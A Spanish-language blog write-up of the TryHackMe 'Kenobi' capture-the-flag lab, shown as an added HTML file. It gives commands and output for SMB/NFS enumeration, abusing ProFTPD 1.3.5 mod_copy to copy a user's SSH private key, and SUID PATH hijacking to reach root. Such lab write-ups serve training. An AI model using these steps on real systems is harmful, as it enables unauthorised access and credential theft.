@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            Kenobi [TryHackMe]  &ndash;
+        
+        K3ssDev
+:/var/log$  
+    </title>
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://k3ssdev.github.io/css/styles.c5c0ca1ad04162d8cbbaa1291d7d0e5d96b9ad04a6b2b68c8ed577d7eabb970ab79d33477f3b13c760eed232f5f642bdcbce1f28bf3f057c36edf5e6c41d203c.css integrity="sha512-xcDKGtBBYtjLuqEpHX0OXZa5rQSmsraMjtV31&#43;q7lwq3nTNHfzsTx2Du0jL19kK9y84fKL8/BXw27fXmxB0gPA==" />
+<meta name="author" content="Alberto Pérez" />
+
+    
+        <meta name="keywords" content=',Linux, Easy, FTP, Privilege Escalation, SAMBA, SUID, TryHackMe' />
+    
+    
+        <meta name="description" content=" ¨Kenobi” está pensada como introducción de la serie “Offensive Pentesting”. Es la tercera máquina, y tiene una dificultad baja. El objetivo es vulnerar una máquina Linux para obtener acceso a un recurso compartido de Samba, manipular una versión vulnerable de proftpd para obtener acceso inicial y escalar privilegios a root a través de un binario SUID." />
+    
+
+<meta property="og:site_name"
+    content='K3ssDev
+:/var/log$  ' />
+
+    <meta property="og:title" content="Kenobi [TryHackMe]" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Alberto Pérez" />
+    <meta
+        property="article:published_time"
+        content='2023-08-28T10:00:00Z&#43;0200' />
+    
+        
+            <meta property="article:tag" content=",Linux" />
+        
+            <meta property="article:tag" content="Easy" />
+        
+            <meta property="article:tag" content="FTP" />
+        
+            <meta property="article:tag" content="Privilege Escalation" />
+        
+            <meta property="article:tag" content="SAMBA" />
+        
+            <meta property="article:tag" content="SUID" />
+        
+            <meta property="article:tag" content="TryHackMe" />
+        
+    
+    <meta property="og:url" content="https://k3ssdev.github.io/posts/kenobi/" />
+    <meta property="og:image"
+        content='https://k3ssdev.github.io/images/post_pics/kenobi/kenobi.png
+        ' />
+    
+        <meta property="og:description" content="Introducción La sala ¨Kenobi” está pensada como introducción de la serie “Offensive Pentesting”. Es la tercera máquina, y tiene una dificultad baja. El objetivo" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='k3ssdev.github.io'
+/>
+<meta property="twitter:url" content="https://k3ssdev.github.io/posts/kenobi/" />
+
+
+    <meta name="twitter:title" content="Kenobi [TryHackMe]" />
+    
+    <meta name="twitter:image"
+        content='https://k3ssdev.github.io/images/post_pics/kenobi/kenobi.png
+        ' />
+    
+        <meta name="twitter:description" content="Introducción La sala ¨Kenobi” está pensada como introducción de la serie “Offensive Pentesting”. Es la tercera máquina, y tiene una dificultad baja. El objetivo" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' />
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">K3ssDev
+:/var/log$  </a>
+                        
+                    </h1>
+                    
+                        <label id="hamburger-menu" for="main-nav-toggler">
+                            &#xf85b;
+                        </label>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="mailto:k3ssdev@proton.me">
+    
+    
+        &#xf6ed;
+    
+    <span>
+        Email
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://www.linkedin.com/in/alberto-perez-del-rio/">
+    
+    
+        &#xf0e1;
+    
+    <span>
+        Linkedin
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/k3ssdev">
+    
+    
+        &#xf09b;
+    
+    <span>
+        Github
+    </span>
+</a>
+
+    </div>
+    
+        <div id="sidebar_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+        
+    
+<script src="https://tryhackme.com/badge/1277295"></script>
+
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>Kenobi [TryHackMe]</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2023-08-28
+
+</p>
+    
+    
+    
+        <figure style="margin: 0">
+            <img src="/images/post_pics/kenobi/kenobi.png" alt="" />
+            
+        </figure>
+    
+    
+    <div><h2 id="introducción">Introducción</h2>
+<p>La sala ¨Kenobi” está pensada como introducción de la serie “Offensive Pentesting”. Es la tercera máquina, y tiene una dificultad baja. El objetivo es vulnerar una máquina Linux para obtener acceso a un recurso compartido de Samba, manipular una versión vulnerable de proftpd para obtener acceso inicial y escalar privilegios a root a través de un binario SUID.</p>
+<h2 id="task-1---desplegar-la-máquina">Task 1 - Desplegar la máquina</h2>
+<h3 id="paso-1">Paso 1:</h3>
+<ul>
+<li>Escaneo la máquina desplegada para descubrir los servicios. Encuentro 7 puertos abiertos.</li>
+<li>El objetivo tiene servicios FTP, SSH, HTTP y SAMBA como posibles vectores de ataque.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Escaneo inicial con salida a fichero</span>
+</span></span><span style="display:flex;"><span>sudo nmap -sS --min-rate <span style="color:#ae81ff">5000</span> -p- -Pn -v -oN nmap_inicial 10.10.107.4
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Listo y filtro los puertos en nmap_inicial</span>
+</span></span><span style="display:flex;"><span>ports<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat nmap_inicial | grep <span style="color:#e6db74">&#39;^[0-9]&#39;</span> | cut -d <span style="color:#e6db74">&#39;/&#39;</span> -f1 | xargs | tr <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#e6db74">&#39;,&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Escaneo final con los puertos guardados</span>
+</span></span><span style="display:flex;"><span>nmap -p$ports -sC -sV -Pn -oN nmap_final 10.10.107.4
+</span></span></code></pre></div><ul>
+<li>Salida de shell para analizar:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Resultado de escaneo</span>
+</span></span><span style="display:flex;"><span>╰─ cat nmap_final | grep tcp                                                                                                                                                                                      ─╯
+</span></span><span style="display:flex;"><span>21/tcp    open  ftp         ProFTPD 1.3.5
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp    open  http        Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>111/tcp   open  rpcbind     2-4 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100000)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  2,3,4        111/tcp   rpcbind
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  3,4          111/tcp6  rpcbind
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100003</span>  2,3,4       2049/tcp   nfs
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100003</span>  2,3,4       2049/tcp6  nfs
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100005</span>  1,2,3      58369/tcp6  mountd
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100005</span>  1,2,3      59881/tcp   mountd
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100021</span>  1,3,4      40297/tcp6  nlockmgr
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100021</span>  1,3,4      44483/tcp   nlockmgr
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100227</span>  2,3         2049/tcp   nfs_acl
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100227</span>  2,3         2049/tcp6  nfs_acl
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open           Samba smbd 4.3.11-Ubuntu <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>2049/tcp  open  nfs         2-4 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100003)</span>
+</span></span><span style="display:flex;"><span>44483/tcp open  nlockmgr    1-4 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100021)</span>
+</span></span><span style="display:flex;"><span>49693/tcp open  mountd      1-3 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100005)</span>
+</span></span><span style="display:flex;"><span>50169/tcp open  mountd      1-3 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100005)</span>
+</span></span><span style="display:flex;"><span>59881/tcp open  mountd      1-3 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100005)</span>
+</span></span></code></pre></div><h2 id="task-2---enumerando-samba">Task 2 - Enumerando Samba</h2>
+<ul>
+<li>Uso de nuevo nmap con un script específico para enumerar servicios SMB.</li>
+<li>Se encuentran 3 recursos compartidos, siendo “anonymous” uno de ellos, siendo una posible vía de acceso inicial.</li>
+<li>Se accede con smbclient y la cuenta anonymous, encontrando un fichero log con informacion sobre claves SSH y configuración de FTP.</li>
+<li>Escaneo puerto 111 para RPCbind con scripts de Network File Sharing usando nmap. Se encuentra un punto de montaje en “/var”.</li>
+</ul>
+<h3 id="paso-1-enumero-smb-con-nmap">Paso 1: Enumero SMB con NMAP</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p <span style="color:#ae81ff">445</span> --script<span style="color:#f92672">=</span>smb-enum-shares.nse,smb-enum-users.nse 10.10.107.4
+</span></span></code></pre></div><ul>
+<li>Resultado para analizar</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb-enum-shares: 
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">\\</span>10.10.107.4<span style="color:#ae81ff">\I</span>PC$: 
+</span></span><span style="display:flex;"><span>|     Type: STYPE_IPC_HIDDEN
+</span></span><span style="display:flex;"><span>|     Comment: IPC Service <span style="color:#f92672">(</span>kenobi server <span style="color:#f92672">(</span>Samba, Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|     Users: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>|     Max Users: &lt;unlimited&gt;
+</span></span><span style="display:flex;"><span>|     Path: C:<span style="color:#ae81ff">\t</span>mp
+</span></span><span style="display:flex;"><span>|     Anonymous access: READ/WRITE
+</span></span><span style="display:flex;"><span>|     Current user access: READ/WRITE
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">\\</span>10.10.107.4<span style="color:#ae81ff">\a</span>nonymous: 
+</span></span><span style="display:flex;"><span>|     Type: STYPE_DISKTREE
+</span></span><span style="display:flex;"><span>|     Comment: 
+</span></span><span style="display:flex;"><span>|     Users: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>|     Max Users: &lt;unlimited&gt;
+</span></span><span style="display:flex;"><span>|     Path: C:<span style="color:#ae81ff">\h</span>ome<span style="color:#ae81ff">\k</span>enobi<span style="color:#ae81ff">\s</span>hare
+</span></span><span style="display:flex;"><span>|     Anonymous access: READ/WRITE
+</span></span><span style="display:flex;"><span>|     Current user access: READ/WRITE
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">\\</span>10.10.107.4<span style="color:#ae81ff">\p</span>rint$: 
+</span></span><span style="display:flex;"><span>|     Type: STYPE_DISKTREE
+</span></span><span style="display:flex;"><span>|     Comment: Printer Drivers
+</span></span><span style="display:flex;"><span>|     Users: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>|     Max Users: &lt;unlimited&gt;
+</span></span><span style="display:flex;"><span>|     Path: C:<span style="color:#ae81ff">\v</span>ar<span style="color:#ae81ff">\l</span>ib<span style="color:#ae81ff">\s</span>amba<span style="color:#ae81ff">\p</span>rinters
+</span></span><span style="display:flex;"><span>|     Anonymous access: &lt;none&gt;
+</span></span><span style="display:flex;"><span>|_    Current user access: &lt;none&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 6.49 seconds
+</span></span></code></pre></div><h3 id="paso-2-accedo-con-smbclient">Paso 2: Accedo con smbclient</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># accedo con smbclient</span>
+</span></span><span style="display:flex;"><span>smbclient //10.10.107.4/anonymous
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Reviso contenido</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Wed Sep  <span style="color:#ae81ff">4</span> 12:49:09 <span style="color:#ae81ff">2019</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Wed Sep  <span style="color:#ae81ff">4</span> 12:56:07 <span style="color:#ae81ff">2019</span>
+</span></span><span style="display:flex;"><span>  log.txt                             N    <span style="color:#ae81ff">12237</span>  Wed Sep  <span style="color:#ae81ff">4</span> 12:49:09 <span style="color:#ae81ff">2019</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Descargo fichero</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get log.txt
+</span></span></code></pre></div><h3 id="paso-3-escaneo-de-puerto-rpc">Paso 3: Escaneo de puerto RPC</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Escaneo con nmap del puerto 111</span>
+</span></span><span style="display:flex;"><span>nmap -p <span style="color:#ae81ff">111</span> --script<span style="color:#f92672">=</span>nfs-ls,nfs-statfs,nfs-showmount 10.10.107.4
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Resultado</span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-08-27 22:32 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.107.4
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.042s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>111/tcp open  rpcbind
+</span></span><span style="display:flex;"><span>| nfs-showmount: 
+</span></span><span style="display:flex;"><span>|_  /var *
+</span></span></code></pre></div><h2 id="task-3---acceso-inicial-con-proftpd">Task 3 - Acceso inicial con ProFTPD</h2>
+<ul>
+<li>
+<p>La versión del servicio es 1.3.5</p>
+</li>
+<li>
+<p>En Exploit-DB se encuentra 4 exploits para esa versión.</p>
+</li>
+<li>
+<p>Se usa el exploit de **<strong>ProFTPD module <code>mod_copy</code>.</strong></p>
+</li>
+<li>
+<p>El módulo mod_copy implementa los comandos SITE CPFR y SITE CPTO, que se pueden usar para copiar archivos/directorios de un lugar a otro en el servidor. Cualquier cliente no autenticado puede aprovechar estos comandos para copiar archivos desde cualquier parte del sistema de archivos a un destino elegido.</p>
+</li>
+<li>
+<p>Me conecto con netcat y descargo la clave privada de Kenobi.</p>
+</li>
+<li>
+<p>Monto el directorio compartido /var/tmp en mi equipo y descargo la clave privada ssh.</p>
+</li>
+</ul>
+<h3 id="paso-4-conexión-con-netcat">Paso 4: Conexión con Netcat</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Conexion al puerto 21 con Netcat</span>
+</span></span><span style="display:flex;"><span>nc 10.10.107.4 <span style="color:#ae81ff">21</span>                                                                                                                                                                                              ─╯
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> ProFTPD 1.3.5 Server <span style="color:#f92672">(</span>ProFTPD Default Installation<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.107.4<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># En nc, ejecuto el primer comando para copiar el fichero </span>
+</span></span><span style="display:flex;"><span>SITE CPFR /home/kenobi/.ssh/id_rsa
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">350</span> File or directory exists, ready <span style="color:#66d9ef">for</span> destination name
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ejecuto el segundo comando que lo pega en la unidad montada en /var</span>
+</span></span><span style="display:flex;"><span>SITE CPTO /var/tmp/id_rsa  
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> Copy successful
+</span></span></code></pre></div><h3 id="paso-5-acceso-al-directorio-remoto">Paso 5: Acceso al directorio remoto</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Creo una carpeta en mi equipo</span>
+</span></span><span style="display:flex;"><span>mkdir /mnt/kenobiNFS
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Monto el directorio compartido en mi equipo</span>
+</span></span><span style="display:flex;"><span>mount 10.10.107.4:/var /mnt/kenobiNFS
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Listo el directorio para comprobarlo</span>
+</span></span><span style="display:flex;"><span>ls -la /mnt/kenobiNFS
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">56</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">14</span> root root  <span style="color:#ae81ff">4096</span> sep  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2019</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root root  <span style="color:#ae81ff">4096</span> ago <span style="color:#ae81ff">27</span> 22:44 ..
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> root root  <span style="color:#ae81ff">4096</span> sep  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2019</span> backups
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">9</span> root root  <span style="color:#ae81ff">4096</span> sep  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2019</span> cache
+</span></span><span style="display:flex;"><span>drwxrwxrwt  <span style="color:#ae81ff">2</span> root root  <span style="color:#ae81ff">4096</span> sep  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2019</span> crash
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">40</span> root root  <span style="color:#ae81ff">4096</span> sep  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2019</span> lib
+</span></span><span style="display:flex;"><span>drwxrwsr-x  <span style="color:#ae81ff">2</span> root staff <span style="color:#ae81ff">4096</span> abr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2016</span> local
+</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> root root     <span style="color:#ae81ff">9</span> sep  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2019</span> lock -&gt; /run/lock
+</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">10</span> root tss   <span style="color:#ae81ff">4096</span> sep  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2019</span> log
+</span></span><span style="display:flex;"><span>drwxrwsr-x  <span style="color:#ae81ff">2</span> root mail  <span style="color:#ae81ff">4096</span> feb <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2019</span> mail
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> root root  <span style="color:#ae81ff">4096</span> feb <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2019</span> opt
+</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> root root     <span style="color:#ae81ff">4</span> sep  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2019</span> run -&gt; /run
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> root root  <span style="color:#ae81ff">4096</span> ene <span style="color:#ae81ff">30</span>  <span style="color:#ae81ff">2019</span> snap
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">5</span> root root  <span style="color:#ae81ff">4096</span> sep  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2019</span> spool
+</span></span><span style="display:flex;"><span>drwxrwxrwt  <span style="color:#ae81ff">6</span> root root  <span style="color:#ae81ff">4096</span> ago <span style="color:#ae81ff">27</span> 22:40 tmp
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root root  <span style="color:#ae81ff">4096</span> sep  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2019</span> www
+</span></span></code></pre></div><h3 id="paso-6-acceso-ssh">Paso 6: Acceso SSH</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Me copio la clave privada que esta en /tmp</span>
+</span></span><span style="display:flex;"><span>cp id_rsa ~/Descargas
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Le doy permisos</span>
+</span></span><span style="display:flex;"><span>sudo chmod <span style="color:#ae81ff">660</span> id_rsa
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Me conecto con la clave privada por ssh</span>
+</span></span><span style="display:flex;"><span>ssh -i id_rsa kenobi@10.10.107.4
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Obtengo la bandera que hay en el home de Kenobi</span>
+</span></span><span style="display:flex;"><span>kenobi@kenobi:~$ cat user.txt
+</span></span></code></pre></div><h2 id="task-4---privilege-escalation-con-la-variable-path">Task 4 - Privilege Escalation con la variable PATH</h2>
+<ul>
+<li>Busco binarios con el bit SUID activado.</li>
+<li>Se encuentra el binario <strong>/usr/bin/menu</strong> que llama la atención sobre el resto.</li>
+<li>El binario tiene un menu con 3 opciones, cada una ejecuta un comando.</li>
+<li>Ejecutando <strong>strings</strong> sobre el binario se ve que comandos ejectua:
+<ul>
+<li><strong>curl -I localhost</strong></li>
+<li><strong>uname -r</strong></li>
+<li><strong>ifconfig</strong></li>
+</ul>
+</li>
+<li>Se modifica <strong>PATH</strong> para explotar el permiso de root que tienen los binarios del menu, haciendo una copia de <strong>/bin/sh</strong> en <strong>/tmp</strong> con el nombre <strong>curl</strong>, le asignamos todos los permisos y exportamos el directorio a la variable <strong>PATH</strong>.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Crear copia de sh en /tmp</span>
+</span></span><span style="display:flex;"><span>cd /tmp/
+</span></span><span style="display:flex;"><span>echo /bin/sh &gt; curl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Dar permisos</span>
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">777</span> curl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exportar a variable PATH</span>
+</span></span><span style="display:flex;"><span>export PATH<span style="color:#f92672">=</span>/tmp:$PATH
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Explotar uso de menu para obtener root</span>
+</span></span><span style="display:flex;"><span>/usr/bin/menu 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>***************************************
+</span></span><span style="display:flex;"><span>1. status check
+</span></span><span style="display:flex;"><span>2. kernel version
+</span></span><span style="display:flex;"><span>3. ifconfig
+</span></span><span style="display:flex;"><span>** Enter your choice :1
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># whoami</span>
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># id</span>
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kenobi<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kenobi<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,110<span style="color:#f92672">(</span>lxd<span style="color:#f92672">)</span>,113<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,114<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>Con <strong>Kenobi</strong> acabamos el bloque introductorio de “Offensive Pentesting”. Es una sala muy sencilla, pero es divertida, sobretodo siendo temática de Star Wars. A partir de ahora se empezará a jugar con máquinas más complejas, por lo que la confianza ganada hasta aquí también considero que es importante subrayar.</p>
+<h2 id="-hack-the-planet">(◕‿‿◕) Hack the planet!</h2>
+</div>
+</article>
+
+    
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
